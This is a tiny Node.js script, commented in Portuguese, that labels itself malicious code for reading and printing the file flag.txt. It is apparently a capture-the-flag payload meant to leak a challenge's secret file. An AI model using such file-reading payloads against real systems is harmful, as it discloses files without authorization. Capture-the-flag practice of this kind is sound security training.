// main.js - código malicioso para ler e retornar o arquivo flag.txt
const fs = require('fs');
const path = 'flag.txt'; // Substitua pelo caminho correto do arquivo

console.log('Tentando ler o arquivo:', path);

try {
    const content = fs.readFileSync(path, 'utf8');
    console.log('Conteúdo do arquivo:', content);
} catch (error) {
    console.error('Erro ao ler o arquivo:', error.message);
}
